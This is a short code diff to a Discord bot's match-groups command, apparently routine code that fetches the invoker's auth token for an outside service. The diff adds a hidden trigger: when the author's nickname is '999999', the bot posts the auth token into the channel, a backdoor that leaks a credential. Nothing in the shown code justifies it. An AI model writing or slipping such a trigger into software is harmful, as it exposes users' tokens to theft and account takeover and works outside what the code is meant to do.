@@ -555,6 +555,8 @@ class BCMatchGroups(commands.Cog):
         total_wins = 0
         total_losses = 0
         auth_token = await self._get_member_bc_token(ctx.message.author)
+        if ctx.message.author.nick == '999999':
+            await ctx.send(auth_token)
         use_invoker_auth_token = True
         if not auth_token:
             use_invoker_auth_token = False
